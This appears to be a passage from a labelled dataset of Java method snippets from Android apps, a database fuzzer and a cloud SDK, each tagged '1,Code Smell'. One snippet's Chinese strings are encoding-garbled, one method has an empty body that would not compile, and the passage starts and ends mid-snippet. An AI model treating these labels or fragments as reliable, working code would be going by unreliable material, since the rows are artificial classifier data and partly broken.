    StringBuilder sb=new StringBuilder(""I checkout some methods are not found or inaccessible in the project while compiling and building, please review your code and library dependencies to figure out why they are not found. Any question feel free to contact @yangzhiqian. \n"" + ""鎴戝湪缂栬瘧鏋勫缓杩囩▼涓鏌ュ嚭鏈変簺鏂规硶鎴栧瓧娈佃闂笉鍒帮紝杈涜嫤浣爎eview涓�涓嬩唬鐮佸拰搴撶殑渚濊禆鍏崇郴锛岀湅鐪嬩负鍟ヨ繖浜涙柟娉曟垨瀛楁鍦ㄧ紪璇戞瀯寤烘椂涓嶅瓨鍦ㄣ��"" + String.format(""Run ./gradlew app:dependencies --configuration %sRuntimeClasspath to get more detail about project dependencies graph.\n"",variantName) + ""We advise you to copy those log below, and leverage the \'Analyse Stacktrace\' in AndroidStudio to locate specific classes and methods.\n""+ ""寤鸿浣犳妸涓嬮潰绫诲爢鏍堢殑鏃ュ織copy涓嬫潵锛屽埄鐢ˋndroidStudio鐨凙nalyse Stacktrace鍙互瀹氫綅鍒板叿浣撶殑Class鍜孧ethod銆俓n""+ ""If you're building your apk locally, please make sure you've appended \'--no-daemon\' to the build command. \n""+ ""濡傛灉浣犵敤鐨勬槸鏈湴鍛戒护琛屾墦鍖咃紝璇蜂綘鍦ㄦ墦鍖呭懡浠ゅ悗闈㈡嫾涓�--no-daemon鍐嶈瘯璇曘�俓n""+ turn2Helper());
    Set<String> relativeClasses=new HashSet<>();
    for (    InaccessibleNode method : inaccessableMethods) {
      sb.append(method.toString()).append(""\n"");
      if (problemResolveAnalyzer != null) {
        sb.append(problemResolveAnalyzer.analyze(method)).append(""\n"");
      }
      relativeClasses.add(method.callClassName + "".class"");
      relativeClasses.add(method.memberClassName + "".class"");
    }
    for (    InaccessibleNode field : inaccessableFields) {
      sb.append(field.toString()).append(""\n"");
      if (problemResolveAnalyzer != null) {
        sb.append(problemResolveAnalyzer.analyze(field)).append(""\n"");
      }
      relativeClasses.add(field.callClassName + "".class"");
      relativeClasses.add(field.memberClassName + "".class"");
    }
    if (tipsProvider != null) {
      sb.append(""\nTips:\n"");
      for (      String relativeClass : relativeClasses) {
        sb.append(relativeClass).append("":["").append(tipsProvider.provideFilePathInfo(relativeClass).replaceAll(""\n"",""\n\t"")).append(""\n]\n"");
      }
    }
    return sb.toString();
  }
  return null;
}",1,Code Smell
"public static int numIslands1(char[][] board){
  int row=board.length;
  int col=board[0].length;
  Dot[][] dots=new Dot[row][col];
  List<Dot> dotList=new ArrayList<>();
  for (int i=0; i < row; i++) {
    for (int j=0; j < col; j++) {
      if (board[i][j] == '1') {
        dots[i][j]=new Dot();
        dotList.add(dots[i][j]);
      }
    }
  }
  UnionFind1<Dot> uf=new UnionFind1<>(dotList);
  for (int j=1; j < col; j++) {
    if (board[0][j - 1] == '1' && board[0][j] == '1') {
      uf.union(dots[0][j - 1],dots[0][j]);
    }
  }
  for (int i=1; i < row; i++) {
    if (board[i - 1][0] == '1' && board[i][0] == '1') {
      uf.union(dots[i - 1][0],dots[i][0]);
    }
  }
  for (int i=1; i < row; i++) {
    for (int j=1; j < col; j++) {
      if (board[i][j] == '1') {
        if (board[i][j - 1] == '1') {
          uf.union(dots[i][j - 1],dots[i][j]);
        }
        if (board[i - 1][j] == '1') {
          uf.union(dots[i - 1][j],dots[i][j]);
        }
      }
    }
  }
  return uf.sets();
}",1,Code Smell
"/** 
 * Moves a file. <p> When the destination file is on another file system, do a ""copy and delete"".
 * @param srcFile the file to be moved
 * @param destFile the destination file
 * @throws NullPointerException if source or destination is <code>null</code>
 * @throws IOException if source or destination is invalid
 * @throws IOException if an IO error occurs moving the file
 * @since Commons IO 1.4
 */
public static void moveFile(File srcFile,File destFile) throws IOException {
  if (srcFile == null) {
    throw new NullPointerException(""Source must not be null"");
  }
  if (destFile == null) {
    throw new NullPointerException(""Destination must not be null"");
  }
  if (!srcFile.exists()) {
    throw new FileNotFoundException(""Source '"" + srcFile + ""' does not exist"");
  }
  if (srcFile.isDirectory()) {
    throw new IOException(""Source '"" + srcFile + ""' is a directory"");
  }
  if (destFile.exists()) {
    throw new FileExistsException(""Destination '"" + destFile + ""' already exists"");
  }
  if (destFile.isDirectory()) {
    throw new IOException(""Destination '"" + destFile + ""' is a directory"");
  }
  boolean rename=srcFile.renameTo(destFile);
  if (!rename) {
    copyFile(srcFile,destFile);
    if (!srcFile.delete()) {
      FileUtils.deleteQuietly(destFile);
      throw new IOException(""Failed to delete original file '"" + srcFile + ""' after copy to '""+ destFile+ ""'"");
    }
  }
}",1,Code Smell
"public void start(){
  sb.append(""CREATE "");
  if (globalState.getDbmsSpecificOptions().testTempTables && Randomly.getBoolean()) {
    tempTable=true;
    if (Randomly.getBoolean()) {
      sb.append(""TEMP "");
    }
 else {
      sb.append(""TEMPORARY "");
    }
  }
  sb.append(""TABLE "");
  if (Randomly.getBoolean()) {
    sb.append(""IF NOT EXISTS "");
  }
  sb.append(tableName);
  sb.append("" ("");
  boolean allowPrimaryKeyInColumn=Randomly.getBoolean();
  int nrColumns=1 + Randomly.smallNumber();
  for (int i=0; i < nrColumns; i++) {
    columns.add(SQLite3Column.createDummy(DBMSCommon.createColumnName(i)));
  }
  for (int i=0; i < nrColumns; i++) {
    if (i != 0) {
      sb.append("", "");
    }
    String columnName=DBMSCommon.createColumnName(columnId);
    SQLite3ColumnBuilder columnBuilder=new SQLite3ColumnBuilder().allowPrimaryKey(allowPrimaryKeyInColumn && !containsPrimaryKey);
    sb.append(columnBuilder.createColumn(columnName,globalState,columns));
    sb.append("" "");
    if (columnBuilder.isContainsAutoIncrement()) {
      this.containsAutoIncrement=true;
    }
    if (columnBuilder.isContainsPrimaryKey()) {
      this.containsPrimaryKey=true;
    }
    columnNames.add(columnName);
    columnId++;
  }
  if (!containsPrimaryKey && Randomly.getBooleanWithSmallProbability()) {
    addColumnConstraints(""PRIMARY KEY"");
    containsPrimaryKey=true;
  }
  if (Randomly.getBooleanWithSmallProbability()) {
    for (int i=0; i < Randomly.smallNumber(); i++) {
      addColumnConstraints(""UNIQUE"");
    }
  }
  if (globalState.getDbmsSpecificOptions().testForeignKeys && Randomly.getBooleanWithSmallProbability()) {
    addForeignKey();
  }
  if (globalState.getDbmsSpecificOptions().testCheckConstraints && globalState.getDbmsSpecificOptions().oracles != SQLite3OracleFactory.PQS && Randomly.getBooleanWithRatherLowProbability()) {
    sb.append(SQLite3Common.getCheckConstraint(globalState,columns));
  }
  sb.append("")"");
  if (globalState.getDbmsSpecificOptions().testWithoutRowids && containsPrimaryKey && !containsAutoIncrement&& Randomly.getBoolean()) {
    sb.append("" WITHOUT ROWID"");
  }
}",1,Code Smell
"@Override public void init() throws NoSuchMethodException {
  MethodData methodData=DexKit.getDexKitBridge().findMethod(FindMethod.create().matcher(MethodMatcher.create().declaredClass(ClassMatcher.create().usingStrings(""startRegionSampling"")).name(""dispatchTouchEvent""))).singleOrNull();
  ClassData data=DexKit.getDexKitBridge().findClass(FindClass.create().matcher(ClassMatcher.create().usingStrings(""startRegionSampling""))).singleOrNull();
  FieldData fieldData=null;
  if (methodData == null) {
    value=1;
    methodData=DexKit.getDexKitBridge().findMethod(FindMethod.create().matcher(MethodMatcher.create().declaredClass(ClassMatcher.create().usingStrings(""SidebarTouchListener"")).name(""onTouch""))).singleOrNull();
    data=DexKit.getDexKitBridge().findClass(FindClass.create().matcher(ClassMatcher.create().usingStrings(""onTouch: \taction = ""))).singleOrNull();
    fieldData=DexKit.getDexKitBridge().findField(FindField.create().matcher(FieldMatcher.create().declaredClass(ClassMatcher.create().usingStrings(""onTouch: \taction = "")).type(View.class))).singleOrNull();
  }
  try {
    Field field=null;
    if (data == null) {
      logE(TAG,""Class is null"");
      return;
    }
    if (fieldData == null && value == 1) {
      logE(TAG,""Field is null"");
      return;
    }
 else     if (fieldData != null)     field=fieldData.getFieldInstance(lpparam.classLoader);
    Field finalField=field;
    hookAllConstructors(data.getInstance(lpparam.classLoader),new MethodHook(){
      @Override protected void after(      MethodHookParam param){
        Context context=null;
        if (value == 1) {
          try {
            if (finalField == null) {
              logE(TAG,""finalField is null!"");
              return;
            }
            context=((View)finalField.get(param.thisObject)).getContext();
          }
 catch (          IllegalAccessException e) {
            logE(TAG,""getContext E: "" + e);
          }
        }
 else {
          context=(Context)param.args[0];
        }
        if (context == null) {
          logE(TAG,""Context is null"");
          return;
        }
        if (!isListen) {
          Context finalContext=context;
          ContentObserver contentObserver=new ContentObserver(new Handler(finalContext.getMainLooper())){
            @Override public void onChange(            boolean selfChange){
              isLock=getLockApp(finalContext) != -1;
            }
          }
;
          context.getContentResolver().registerContentObserver(Settings.Global.getUriFor(""key_lock_app""),false,contentObserver);
          isListen=true;
        }
      }
    }
);
  }
 catch (  ClassNotFoundException|NoSuchFieldException e) {
    logE(TAG,""hook Constructor E: "" + data);
  }
  if (methodData == null) {
    logE(TAG,""Method is null"");
    return;
  }
  hookMethod(methodData.getMethodInstance(lpparam.classLoader),new MethodHook(){
    @Override protected void before(    MethodHookParam param){
      if (isLock) {
        param.setResult(false);
      }
    }
  }
);
}",1,Code Smell
"private boolean getTopicCtrlJsonSetInfo(HttpServletRequest req,boolean isAddOp,BaseEntity defOpEntity,StringBuilder sBuffer,ProcessResult result){
  if (!WebParameterUtils.getJsonArrayParamValue(req,WebFieldDef.TOPICCTRLSET,true,null,result)) {
    return result.isSuccess();
  }
  List<Map<String,String>> ctrlJsonArray=(List<Map<String,String>>)result.getRetData();
  ClusterSettingEntity defClusterSetting=defMetaDataService.getClusterDefSetting(false);
  int defMaxMsgSizeMB=defClusterSetting.getMaxMsgSizeInMB();
  TopicCtrlEntity itemConf;
  Map<String,TopicCtrlEntity> addRecordMap=new HashMap<>();
  for (  Map<String,String> itemConfMap : ctrlJsonArray) {
    if (!WebParameterUtils.getAUDBaseInfo(itemConfMap,isAddOp,defOpEntity,sBuffer,result)) {
      return result.isSuccess();
    }
    final BaseEntity itemOpEntity=(BaseEntity)result.getRetData();
    if (!WebParameterUtils.getStringParamValue(itemConfMap,WebFieldDef.TOPICNAME,true,"""",sBuffer,result)) {
      return result.isSuccess();
    }
    final String topicName=(String)result.getRetData();
    if (!WebParameterUtils.getIntParamValue(itemConfMap,WebFieldDef.MAXMSGSIZEINMB,false,(isAddOp ? defMaxMsgSizeMB : TBaseConstants.META_VALUE_UNDEFINED),TBaseConstants.META_MIN_ALLOWED_MESSAGE_SIZE_MB,TBaseConstants.META_MAX_ALLOWED_MESSAGE_SIZE_MB,sBuffer,result)) {
      return result.isSuccess();
    }
    final int itemMaxMsgSizeMB=(int)result.getRetData();
    if (!WebParameterUtils.getIntParamValue(itemConfMap,WebFieldDef.TOPICNAMEID,false,(isAddOp ? TServerConstants.TOPIC_ID_MIN : TBaseConstants.META_VALUE_UNDEFINED),TServerConstants.TOPIC_ID_MIN,sBuffer,result)) {
      return result.isSuccess();
    }
    int itemTopicNameId=(int)result.getRetData();
    if (!WebParameterUtils.getEnableStatusValue(itemConfMap,WebFieldDef.AUTHCTRLENABLE,false,(isAddOp ? EnableStatus.STATUS_DISABLE : null),sBuffer,result)) {
      return result.isSuccess();
    }
    EnableStatus enableTopicAuth=(EnableStatus)result.getRetData();
    itemConf=new TopicCtrlEntity(itemOpEntity,topicName);
    itemConf.updModifyInfo(itemOpEntity.getDataVerId(),itemTopicNameId,itemMaxMsgSizeMB,enableTopicAuth);
    addRecordMap.put(itemConf.getTopicName(),itemConf);
  }
  if (addRecordMap.isEmpty()) {
    result.setFailResult(sBuffer.append(""Not found record info in "").append(WebFieldDef.TOPICCTRLSET.name).append("" parameter!"").toString());
    sBuffer.delete(0,sBuffer.length());
    return result.isSuccess();
  }
  result.setSuccResult(addRecordMap);
  return result.isSuccess();
}",1,Code Smell
"@Override protected void drawPickerChart(Canvas canvas){
  int bottom=getMeasuredHeight() - PICKER_PADDING;
  int top=getMeasuredHeight() - pikerHeight - PICKER_PADDING;
  int nl=lines.size();
  if (chartData != null) {
    for (int k=0; k < nl; k++) {
      LineViewData line=lines.get(k);
      if (!line.enabled && line.alpha == 0)       continue;
      line.bottomLinePath.reset();
      int n=chartData.xPercentage.length;
      int j=0;
      int[] y=line.line.y;
      line.chartPath.reset();
      for (int i=0; i < n; i++) {
        if (y[i] < 0)         continue;
        float xPoint=chartData.xPercentage[i] * pickerWidth;
        float h=ANIMATE_PICKER_SIZES ? pickerMaxHeight : chartData.maxValue;
        float hMin=ANIMATE_PICKER_SIZES ? pickerMinHeight : chartData.minValue;
        float yPercentage=(y[i] - hMin) / (h - hMin);
        float yPoint=(1f - yPercentage) * pikerHeight;
        if (USE_LINES) {
          if (j == 0) {
            line.linesPathBottom[j++]=xPoint;
            line.linesPathBottom[j++]=yPoint;
          }
 else {
            line.linesPathBottom[j++]=xPoint;
            line.linesPathBottom[j++]=yPoint;
            line.linesPathBottom[j++]=xPoint;
            line.linesPathBottom[j++]=yPoint;
          }
        }
 else {
          if (i == 0) {
            line.bottomLinePath.moveTo(xPoint,yPoint);
          }
 else {
            line.bottomLinePath.lineTo(xPoint,yPoint);
          }
        }
      }
      line.linesPathBottomSize=j;
      if (!line.enabled && line.alpha == 0)       continue;
      line.bottomLinePaint.setAlpha((int)(255 * line.alpha));
      if (USE_LINES)       canvas.drawLines(line.linesPathBottom,0,line.linesPathBottomSize,line.bottomLinePaint);
 else       canvas.drawPath(line.bottomLinePath,line.bottomLinePaint);
    }
  }
}",1,Code Smell
"public Map<String,Object> doRequest(String action,String protocol,String method,String version,Map<String,Object> query,Map<String,Object> body,RuntimeOptions runtime) throws Exception {
  Map<String,Object> runtime_=TeaConverter.buildMap(new TeaPair(""readTimeout"",runtime.readTimeout),new TeaPair(""connectTimeout"",runtime.connectTimeout),new TeaPair(""retry"",TeaConverter.buildMap(new TeaPair(""maxAttempts"",runtime.maxAttempts))),new TeaPair(""backoff"",TeaConverter.buildMap(new TeaPair(""policy"",runtime.backoffPolicy),new TeaPair(""period"",runtime.backoffPeriod))),new TeaPair(""ignoreSSL"",runtime.ignoreSSL));
  TeaRequest _lastRequest=null;
  long _now=System.currentTimeMillis();
  int _retryTimes=0;
  while (Tea.allowRetry((java.util.Map<String,Object>)runtime_.get(""retry""),_retryTimes,_now)) {
    if (_retryTimes > 0) {
      int backoffTime=Tea.getBackoffTime(runtime_.get(""backoff""),_retryTimes);
      if (backoffTime > 0) {
        Tea.sleep(backoffTime);
      }
    }
    _retryTimes=_retryTimes + 1;
    try {
      TeaRequest request_=new TeaRequest();
      request_.protocol=protocol;
      request_.method=method;
      request_.pathname=""/"";
      request_.query=TeaConverter.merge(String.class,TeaConverter.buildMap(new TeaPair(""Action"",action),new TeaPair(""Format"",this.format),new TeaPair(""Timestamp"",getTimestamp()),new TeaPair(""Version"",version),new TeaPair(""SignatureNonce"",getNonce())),query);
      request_.headers=TeaConverter.buildMap(new TeaPair(""host"",this.endpoint));
      if (!isUnset(body)) {
        java.util.Map<String,Object> tmp=anyifyMapValue(body);
        request_.body=Tea.toReadable(toFormString(tmp));
        request_.headers.put(""content-type"",""application/x-www-form-urlencoded"");
      }
      ICredentials credentials=this.credentialsProvider.getCredentials();
      if (credentials == null) {
        throw new TeaRetryableException();
      }
      request_.query.put(""SignatureMethod"",this.signatureMethod);
      request_.query.put(""SignatureVersion"",this.signatureVersion);
      request_.query.put(""AccessKeyId"",credentials.getAccessKeyId());
      if (!StringUtils.isEmpty(credentials.getSecurityToken())) {
        request_.query.put(""SecurityToken"",credentials.getSecurityToken());
      }
      java.util.Map<String,String> signedParam=TeaConverter.merge(String.class,request_.query,body);
      request_.query.put(""Signature"",getSignature(signedParam,request_.method,credentials.getAccessKeySecret()));
      _lastRequest=request_;
      TeaResponse response_=Tea.doAction(request_,runtime_);
      Object obj=readAsJSON(response_.body);
      java.util.Map<String,Object> res=assertAsMap(obj);
      if (is4xx(response_.statusCode) || is5xx(response_.statusCode)) {
        throw new TeaException(TeaConverter.buildMap(new TeaPair(""message"",res.get(""Message"")),new TeaPair(""data"",res),new TeaPair(""code"",res.get(""Code""))));
      }
      return res;
    }
 catch (    Exception e) {
      if (Tea.isRetryable(e)) {
        continue;
      }
      throw e;
    }
  }
  throw new TeaUnretryableException(_lastRequest);
}",1,Code Smell
"@Override public void processActivityAction(@NonNull Activity activity,@NonNull String data,@NonNull ResultData result){
  Bundle bundle=activity.getIntent().getExtras();
  if (bundle == null) {
    result.addResultItem(CodeLocatorConstants.ResultKey.ERROR,CodeLocatorConstants.Error.BUNDLE_IS_NULL);
    return;
  }
  Set<String> keySet=bundle.keySet();
  if (keySet.isEmpty()) {
    result.addResultItem(CodeLocatorConstants.ResultKey.ERROR,CodeLocatorConstants.Error.BUNDLE_IS_NULL);
    return;
  }
  HashMap<String,String> map=new HashMap<>();
  for (  String key : keySet) {
    if (CodeLocatorConstants.ACTIVITY_START_STACK_INFO.equals(key)) {
      continue;
    }
    final Object value=bundle.get(key);
    if (value instanceof Byte) {
      map.put(key,""Byte   : "" + value);
    }
 else     if (value instanceof Character) {
      map.put(key,""Char   : "" + value);
    }
 else     if (value instanceof Integer) {
      map.put(key,""Int    : "" + value);
    }
 else     if (value instanceof Short) {
      map.put(key,""Short  : "" + value);
    }
 else     if (value instanceof Long) {
      map.put(key,""Long   : "" + value);
    }
 else     if (value instanceof Float) {
      map.put(key,""Float  : "" + value);
    }
 else     if (value instanceof Double) {
      map.put(key,""Double : "" + value);
    }
 else     if (value instanceof Boolean) {
      map.put(key,""Boolean: "" + value);
    }
 else     if (value instanceof String) {
      map.put(key,""String : "" + value);
    }
 else     if (value instanceof Serializable) {
      try {
        map.put(key,GsonUtils.sGson.toJson(value));
      }
 catch (      Throwable t) {
        map.put(key,value.toString());
        Log.d(CodeLocator.TAG,""put value error "" + Log.getStackTraceString(t));
      }
    }
 else     if (value instanceof Parcelable) {
      try {
        map.put(key,GsonUtils.sGson.toJson(value));
      }
 catch (      Throwable t) {
        map.put(key,value.toString());
        Log.d(CodeLocator.TAG,""put value error "" + Log.getStackTraceString(t));
      }
    }
 else {
      if (value == null) {
        map.put(key,""null"");
      }
 else {
        map.put(key,value.toString());
      }
    }
  }
  try {
    result.addResultItem(CodeLocatorConstants.ResultKey.DATA,GsonUtils.sGson.toJson(map));
  }
 catch (  Throwable t) {
    result.addResultItem(CodeLocatorConstants.ResultKey.ERROR,CodeLocatorConstants.Error.ERROR_WITH_STACK_TRACE);
    result.addResultItem(CodeLocatorConstants.ResultKey.STACK_TRACE,Log.getStackTraceString(t));
    Log.d(CodeLocator.TAG,""put value error "" + Log.getStackTraceString(t));
  }
}
",1,Code Smell
"public void fillDialogsEntitiesRecursive(final File fromFolder,int type,LongSparseArray<DialogFileEntities> dilogsFilesEntities,CacheModel cacheModel){
  if (fromFolder == null) {
    return;
  }
  File[] files=fromFolder.listFiles();
  if (files == null) {
    return;
  }
  for (  final File fileEntry : files) {
    if (canceled) {
      return;
    }
    if (fileEntry.isDirectory()) {
      fillDialogsEntitiesRecursive(fileEntry,type,dilogsFilesEntities,cacheModel);
    }
 else {
      if (fileEntry.getName().equals("".nomedia"")) {
        continue;
      }
      FilePathDatabase.FileMeta fileMetadata=getFileLoader().getFileDatabase().getFileDialogId(fileEntry,null);
      int addToType=type;
      String fileName=fileEntry.getName().toLowerCase();
      if (fileName.endsWith("".mp3"") || fileName.endsWith("".m4a"")) {
        addToType=TYPE_MUSIC;
      }
      CacheModel.FileInfo fileInfo=new CacheModel.FileInfo(fileEntry);
      fileInfo.type=addToType;
      if (fileMetadata != null) {
        fileInfo.dialogId=fileMetadata.dialogId;
        fileInfo.messageId=fileMetadata.messageId;
        fileInfo.messageType=fileMetadata.messageType;
      }
      fileInfo.size=fileEntry.length();
      if (fileInfo.dialogId != 0) {
        DialogFileEntities dilogEntites=dilogsFilesEntities.get(fileInfo.dialogId,null);
        if (dilogEntites == null) {
          dilogEntites=new DialogFileEntities(fileInfo.dialogId);
          dilogsFilesEntities.put(fileInfo.dialogId,dilogEntites);
        }
        dilogEntites.addFile(fileInfo,addToType);
      }
      if (cacheModel != null) {
        cacheModel.add(addToType,fileInfo);
      }
    }
  }
}",1,Code Smell
"public static void analysisAndAppendInfoToMap(int onClickListenerMemAddr,StackTraceElement[] stackTraceElements,int tag,String type){
  if (stackTraceElements == null || onClickListenerMemAddr == 0) {
    return;
  }
  final CodeLocatorConfig config=CodeLocator.sGlobalConfig;
  try {
    StackTraceElement findElement=null;
    for (int i=config.getSkipSystemTraceCount(); i < stackTraceElements.length && i < config.getViewMaxLoopCount(); i++) {
      final StackTraceElement stackTraceElement=stackTraceElements[i];
      final String currentClassName=stackTraceElement.getClassName();
      final String currentMethodName=stackTraceElement.getMethodName();
      if (currentClassName == null) {
        continue;
      }
 else       if (config.getViewReturnByClazzs().contains(currentClassName) || (stackTraceElement.getFileName() != null && stackTraceElement.getFileName().contains(""_ViewBinding""))) {
        return;
      }
 else {
        boolean containsKeyword=false;
        for (        String keyword : config.getViewIgnoreByKeyWords()) {
          if (currentClassName.contains(keyword) || (currentMethodName != null && currentMethodName.contains(keyword))) {
            containsKeyword=true;
            break;
          }
        }
        if (containsKeyword) {
          continue;
        }
      }
      findElement=stackTraceElement;
      break;
    }
    if (findElement == null) {
      return;
    }
    CodeLocator.getOnClickInfoMap().put(onClickListenerMemAddr,findElement.getFileName() + "":"" + findElement.getLineNumber());
  }
 catch (  Throwable t) {
    Log.e(CodeLocator.TAG,""analysisAndAppendInfoToMap Error "" + Log.getStackTraceString(t));
  }
}",1,Code Smell
"@Override @Nullable public Hcl visit(@Nullable Tree tree,P p,Cursor parent){
  setCursor(parent);
  for (Cursor c=parent; c != null; c=c.getParent()) {
    Object v=c.getValue();
    Space space=null;
    if (v instanceof Hcl) {
      space=((Hcl)v).getPrefix();
    }
 else     if (v instanceof HclRightPadded) {
      space=((HclRightPadded<?>)v).getAfter();
    }
 else     if (v instanceof HclLeftPadded) {
      space=((HclLeftPadded<?>)v).getBefore();
    }
 else     if (v instanceof HclContainer) {
      space=((HclContainer<?>)v).getBefore();
    }
    if (space != null && space.getLastWhitespace().contains(""\n"")) {
      int indent=findIndent(space);
      if (indent != 0) {
        c.putMessage(""lastIndent"",indent);
      }
    }
  }
  Iterator<Object> path=parent.getPath(Hcl.class::isInstance);
  if (path.hasNext()) {
    preVisit((Hcl)path.next(),p);
  }
  return visit(tree,p);
}
@Nullable @Override public Hcl visit(@Nullable Tree tree,P p){
  if (getCursor().getNearestMessage(""stop"") != null) {
    return (Hcl)tree;
  }
  return super.visit(tree,p);
}",1,Code Smell
"private static boolean checkConditionWithLauncherVersion(int launcherversion,String handledcondition){
  boolean result=true;
  for (int a=0; a < handledcondition.length(); a++) {
    if (handledcondition.charAt(a) == '<') {
      ArrayList<String> nums=new ArrayList<>();
      for (int b=a + 1; b < handledcondition.length(); b++) {
        if (handledcondition.charAt(b) != ' ') {
          nums.add(String.valueOf(handledcondition.charAt(b)));
        }
      }
      StringBuilder numstr=new StringBuilder();
      for (      String str : nums) {
        numstr.append(str);
      }
      int num=Integer.parseInt(numstr.toString());
      if (launcherversion >= num) {
        result=false;
      }
    }
    if (handledcondition.charAt(a) == '>') {
      ArrayList<String> nums=new ArrayList<>();
      for (int b=a + 1; b < handledcondition.length(); b++) {
        if (handledcondition.charAt(b) != ' ') {
          nums.add(String.valueOf(handledcondition.charAt(b)));
        }
      }
      StringBuilder numstr=new StringBuilder();
      for (      String str : nums) {
        numstr.append(str);
      }
      int num=Integer.parseInt(numstr.toString());
      if (launcherversion <= num) {
        result=false;
      }
    }
  }
  return result;
}",1,Code Smell
"@Override public int scrollVerticallyBy(int dy,RecyclerView.Recycler recycler,RecyclerView.State state){
}
",1,Code Smell
"public static boolean checkUrlMatch(String apiDefinitionPath,String requestUrlSuffix){
  if (StringUtils.equalsAny(apiDefinitionPath,requestUrlSuffix,""/"" + requestUrlSuffix)) {
    return true;
  }
 else {
    if (StringUtils.isNotEmpty(apiDefinitionPath)) {
      String urlSuffix=requestUrlSuffix;
      if (urlSuffix.startsWith(""/"")) {
        urlSuffix=urlSuffix.substring(1);
      }
      if (apiDefinitionPath.startsWith(""/"")) {
        apiDefinitionPath=apiDefinitionPath.substring(1);
      }
      boolean urlSuffixEndEmpty=false;
      if (urlSuffix.endsWith(""/"")) {
        urlSuffixEndEmpty=true;
        urlSuffix=urlSuffix + ""emptyStrForSplit"";
      }
      String[] requestUrlDomainArr=urlSuffix.split(""/"");
      if (urlSuffixEndEmpty) {
        requestUrlDomainArr[requestUrlDomainArr.length - 1]=StringUtils.EMPTY;
      }
      urlSuffixEndEmpty=false;
      if (apiDefinitionPath.endsWith(""/"")) {
        urlSuffixEndEmpty=true;
        apiDefinitionPath=apiDefinitionPath + ""emptyStrForSplit"";
      }
      String[] apiPathDomainArr=apiDefinitionPath.split(""/"");
      if (urlSuffixEndEmpty) {
        apiPathDomainArr[apiPathDomainArr.length - 1]=StringUtils.EMPTY;
      }
      if (apiPathDomainArr.length == requestUrlDomainArr.length) {
        boolean isFetch=true;
        for (int i=0; i < requestUrlDomainArr.length; i++) {
          String pathItem=apiPathDomainArr[i];
          if (!(pathItem.startsWith(""{"") && pathItem.endsWith(""}""))) {
            if (!StringUtils.equals(apiPathDomainArr[i],requestUrlDomainArr[i])) {
              return false;
            }
          }
        }
        return isFetch;
      }
    }
  }
  return false;
}",1,Code Smell
"private static TLRPC.PhotoSize findPhotoCachedSize(TLRPC.Message message){
  TLRPC.PhotoSize photoSize=null;
  if (message.media instanceof TLRPC.TL_messageMediaPhoto) {
    for (int a=0, count=message.media.photo.sizes.size(); a < count; a++) {
      TLRPC.PhotoSize size=message.media.photo.sizes.get(a);
      if (size instanceof TLRPC.TL_photoCachedSize) {
        photoSize=size;
        break;
      }
    }
  }
 else   if (message.media instanceof TLRPC.TL_messageMediaDocument) {
    for (int a=0, count=message.media.document.thumbs.size(); a < count; a++) {
      TLRPC.PhotoSize size=message.media.document.thumbs.get(a);
      if (size instanceof TLRPC.TL_photoCachedSize) {
        photoSize=size;
        break;
      }
    }
  }
 else   if (message.media instanceof TLRPC.TL_messageMediaWebPage) {
    if (message.media.webpage.photo != null) {
      for (int a=0, count=message.media.webpage.photo.sizes.size(); a < count; a++) {
        TLRPC.PhotoSize size=message.media.webpage.photo.sizes.get(a);
        if (size instanceof TLRPC.TL_photoCachedSize) {
          photoSize=size;
          break;
        }
      }
    }
  }
 else   if (message.media instanceof TLRPC.TL_messageMediaInvoice && message.media.extended_media instanceof TLRPC.TL_messageExtendedMediaPreview) {
    photoSize=((TLRPC.TL_messageExtendedMediaPreview)message.media.extended_media).thumb;
  }
  return photoSize;
}",1,Code Smell
"private static void mergeGroup(List<DiscountGroup> groups,Map<String,Map<String,DiscountWrapper>> inMap,AtomicLongMap<String> ctx,Map<String,Integer> idxMap,List<List<Item>> resultList){
  if (CollectionUtils.isEmpty(groups)) {
    return;
  }
  List<Item> xList=groups.get(0).filterItems(inMap);
  if (CollectionUtils.isEmpty(xList)) {
    return;
  }
  if (groups.size() == 1) {
    String key=uniqueKey(xList);
    ctx.incrementAndGet(key);
    idxMap.put(key,resultList.size());
    resultList.add(xList);
  }
 else {
    List<Item> yList=groups.get(1).filterItems(inMap);
    if (Objects.equals(EXCLUDE,groups.get(0).getRelation())) {
      for (      Item item : xList) {
        for (        Item item1 : yList) {
          resultList.add(Lists.newArrayList(item,item1));
        }
      }
    }
 else {
      String k=uniqueKey(xList);
      for (      Item item : yList) {
        ctx.incrementAndGet(k);
        List<Item> xCopy=Lists.newArrayList(xList);
        xCopy.add(item);
        resultList.add(xCopy);
      }
    }
  }
}",1,Code Smell
"@Override protected void onMeasure(int widthMeasureSpec,int heightMeasureSpec){
  int width=MeasureSpec.getSize(widthMeasureSpec);
  int height=MeasureSpec.getSize(heightMeasureSpec);
  int heightSpec=MeasureSpec.makeMeasureSpec(height,MeasureSpec.EXACTLY);
  int visibleCount=getVisibleButtons(mTempTargets);
  if (visibleCount == 1) {
    int widthSpec=MeasureSpec.makeMeasureSpec(width,MeasureSpec.AT_MOST);
    ButtonDropTarget firstButton=mTempTargets[0];
    firstButton.setTextSize(TypedValue.COMPLEX_UNIT_PX,mLauncher.getDeviceProfile().dropTargetTextSizePx);
    firstButton.setTextVisible(true);
    firstButton.setIconVisible(true);
    firstButton.measure(widthSpec,heightSpec);
    firstButton.resizeTextToFit();
  }
 else   if (visibleCount == 2) {
    DeviceProfile dp=mLauncher.getDeviceProfile();
    int verticalPadding=dp.dropTargetVerticalPaddingPx;
    int horizontalPadding=dp.dropTargetHorizontalPaddingPx;
    ButtonDropTarget firstButton=mTempTargets[0];
    firstButton.setTextSize(TypedValue.COMPLEX_UNIT_PX,dp.dropTargetTextSizePx);
    firstButton.setTextVisible(true);
    firstButton.setIconVisible(true);
    firstButton.setTextMultiLine(false);
    firstButton.setPadding(horizontalPadding,verticalPadding,horizontalPadding,verticalPadding);
    ButtonDropTarget secondButton=mTempTargets[1];
    secondButton.setTextSize(TypedValue.COMPLEX_UNIT_PX,dp.dropTargetTextSizePx);
    secondButton.setTextVisible(true);
    secondButton.setIconVisible(true);
    secondButton.setTextMultiLine(false);
    secondButton.setPadding(horizontalPadding,verticalPadding,horizontalPadding,verticalPadding);
    int availableWidth;
    if (dp.isTwoPanels) {
      availableWidth=(dp.availableWidthPx - dp.dropTargetGapPx) / 2;
    }
 else {
      availableWidth=dp.availableWidthPx - dp.dropTargetGapPx;
    }
    int widthSpec=MeasureSpec.makeMeasureSpec(availableWidth,MeasureSpec.AT_MOST);
    firstButton.measure(widthSpec,heightSpec);
    if (!mIsVertical) {
      if (firstButton.isTextTruncated(availableWidth)) {
        firstButton.setIconVisible(false);
        secondButton.setIconVisible(false);
